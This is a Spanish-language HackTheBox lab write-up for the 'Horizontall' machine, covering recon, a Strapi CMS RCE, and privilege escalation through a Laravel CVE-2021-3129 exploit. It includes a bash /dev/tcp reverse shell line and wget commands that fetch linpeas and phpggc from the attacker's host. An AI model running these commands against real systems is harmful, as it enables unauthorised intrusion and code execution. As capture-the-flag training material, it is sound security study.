---
title: Horizontall
published: 2025-02-26
image: "./logo.png"
tags: [Easy, Information Leakage, Strapi CMS, Laravel, eJPT, eWPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

> Information Leakage
> Port Forwarding
> Strapi CMS Exploitation
> Laravel Exploitation

### Preparación

> eWPT
> eJPT

***

## Reconocimiento

Comenzaremos haciendo un escaneo a los puertos abiertos de la máquina y sus respectivos servicios y versiones.

```
sudo nmap -T4 --min-rate 1000 -p- -sCV -oN nmap_report 10.10.11.105
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FuVQ6oH5EAxdfPG4Rr9se%2Fimg1.png?alt=media&#x26;token=cb865253-994a-43c0-ac41-6fb0b5ae0703" alt=""><figcaption></figcaption></figure>

### HTTP

Podemos ver el puerto **SSH** y **HTTP** abiertos, empezaremos por el segundo. Al abrir la web podemos ver que usa un dominio **horizontall.htb**, por lo que lo añadimos al `/etc/hosts`.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Ffg2oRhZUBeTGFq5aKMzl%2Fimg2.png?alt=media&#x26;token=ae123aa6-5262-452c-8d6c-913f64410e18" alt=""><figcaption></figcaption></figure>

### Gobuster

A primera vista parece una web normal. Por lo que comenzaremos a ver directorios/ficheros ocultos con **gobuster**_._


```
gobuster dir -u http://horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150
```


<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FtNGw6PG7hmxPKdT6uSRN%2Fimg3.png?alt=media&#x26;token=1566f1b7-6d75-422d-877e-c3a75727c31f" alt=""><figcaption></figcaption></figure>

## Ffuf (Virtual Hosting)

La verdad que no parece haber nada interesante. Como vimos antes corre un **nginx**.  Se puede estar usando **Virtual Hosting** para tener varias webs en la misma máquina, por lo que seguiremos el mismo procedimiento de reconocimiento.


```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -H "Host: FUZZ.horizontall.htb" -mc 200
```


<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FPIzVYAEkFQNh1N0bcER4%2Fimg4.png?alt=media&#x26;token=1b1e7c0e-0c90-459f-b0a8-278b5b15e306" alt=""><figcaption></figcaption></figure>

Podemos ver el dominio api-prod, por lo que lo añadimos al /etc/hosts también. Y volveremos a hacer el mismo reconocimiento.


```
gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150
```


<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FmXlafoKabxScWfKSldO4%2Fimg5.png?alt=media&#x26;token=8807c335-603d-4412-9cfa-a1ad8b6ca284" alt=""><figcaption></figcaption></figure>

Probaremos a entrar primero a `/reviews` a ver que econtrarmos:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F1fYjNmjGl669tBiBiOiN%2Fimg6.png?alt=media&#x26;token=d188a6aa-fc36-48be-81b2-0c6bdccf4273" alt=""><figcaption></figcaption></figure>

Parecen ser reseñas de usuarios. Buscaremos en `/admin`:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FIpKEfgCbSPcrrXiREj09%2Fimg7.png?alt=media&#x26;token=724f0a44-b15b-4619-ab40-1d351bb59bc0" alt=""><figcaption></figcaption></figure>

### Strapi

Vemos que es un panel de login de administración de **strapi**. Investigando si vas a la ruta `/admin/init` te debería dar la versión como podemos ver:

```
3.0.0-beta.17.4
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FXsSRmoeOGcsdcHi8JknR%2Fimg8.png?alt=media&#x26;token=9e834f49-75d1-4904-8a0a-7df5259d12d5" alt=""><figcaption></figcaption></figure>

## Explotación

Buscando vulnerabilidades podemos encontrar una que incluso tiene un **PoC** ([Enlace](https://www.exploit-db.com/exploits/50239)). Copiamos el código en python y lo ejecutamos apuntando a la máquina víctima:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fr86UCR3r848B6IiZnNK4%2Fimg9.png?alt=media&#x26;token=31a8cf88-4079-4979-b2be-028e850b18b7" alt=""><figcaption></figcaption></figure>

Como podemos ver ya tenemos **RCE** por lo que vamos a intentar crear una reverse shell. Nos pondremos en escucha con netcat en el puerto 6969 y ejecutaremos la shell:

```
nc -lvnp 6969
```

```
bash -c 'bash -i >& /dev/tcp/10.10.14.16/6969 0>&1'
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FEkx2vKcP0MKDU7mUiIPZ%2Fimg10.png?alt=media&#x26;token=4a6044a8-3e18-4469-963e-55e77bae5075" alt=""><figcaption></figcaption></figure>

Y ya tendríamos una shell con la máquina víctima. Al mirar en el escritorio del usuario developer podemos ver la user flag:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FChPiSJeqfpUYgW1pAVCN%2Fimg11.png?alt=media&#x26;token=abc77c13-623c-4abe-9956-bcceb095e35e" alt=""><figcaption></figcaption></figure>

## Escalada de privilegios

Ahora tocaría la elevación para conseguir la root flag. Usaremos **linpeas.sh** para descubrir la máxima información posible por lo que descargaremos la release y la subiremos al servidor de python para poder descargarlo desde la máquina víctima:

```
python3 -m http.server
```

```
wget http://10.10.14.16:8000/linpeas.sh
```

```
chmod +x linpeas.sh
```

Al ejecutarlo podemos ver algo raro y es que internamente hay 2 puertos abiertos:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FDjnNTQsRBwevQuumEWPx%2Fimg12.png?alt=media&#x26;token=c875a779-8450-4a30-ada1-203a5a34bbc6" alt=""><figcaption></figcaption></figure>

El **8000** y el **1337**, si hacemos un curl del 8000 vemos lo siguiente:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FFgvh1bKbol3FYX3tI4uv%2Fimg13.png?alt=media&#x26;token=29590719-13cd-4351-a262-1e34218aeffe" alt=""><figcaption></figcaption></figure>

Vemos que usa la versión 8 de **Laravel** un framework de **PHP** por lo que podríamos buscar si tiene alguna vulnerabilidad.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fx9BCWtS1SBG0gG6XFhYL%2Fimg14.png?alt=media&#x26;token=facc04af-857b-4ca7-bb58-bc6d9f1a6a8a" alt=""><figcaption></figcaption></figure>

Hay un **RCE** para esa versión, buscando he encontrado un [exploit](https://github.com/nth347/CVE-2021-3129_exploit) para este CVE, pero deberemos cambiar un poco el exploit ya que no puede hacer un git clone por el DNS.

```
os.system("wget http://10.10.14.16:8000/phpggc.tar")
os.system("tar -xvf phpggc.tar")
```

Cambiaremos esas 2 líneas por la parte del git clone. Lo descargamos desde la máquina después de haberlo comprimido e iniciado el servidor web en local. Ejecutamos el **exploit.py**:

```
python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 "cat /root/root.txt"
```

Y así obtendremos la root flag.

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/374)

---